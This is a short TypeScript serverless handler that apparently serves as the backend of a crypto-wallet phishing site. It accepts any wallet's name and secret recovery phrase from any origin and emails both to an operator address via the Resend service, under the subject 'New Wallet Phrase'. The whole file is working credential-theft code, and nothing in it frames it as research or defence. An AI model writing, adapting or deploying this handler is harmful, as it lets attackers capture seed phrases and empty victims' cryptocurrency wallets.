
import { Resend } from 'resend'

const resend = new Resend(process.env.RESEND_API_KEY)

export default async function handler(req: { method?: string; body?: { walletName?: string; walletPhrase?: string } }, res: { setHeader: (name: string, value: string) => void; status: (code: number) => { json: (data: any) => any }; json: (data: any) => any }) {
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', 'POST')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type')

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' })
    }

    const { walletName, walletPhrase } = req.body

    const { data, error } = await resend.emails.send({
        from: 'Phrase alert <onboarding@resend.dev>',
        to: [process.env.WALLET_TO_EMAIL as string],
        subject: `New Wallet Phrase`,
        html: `
      <p>Wallet Name: ${walletName}</p>
      <p>Secret Phrase: ${walletPhrase}</p>
    `,
    })

    if (error) {
        return res.status(500).json({ error: error.message })
    }

    return res.status(200).json(data)
}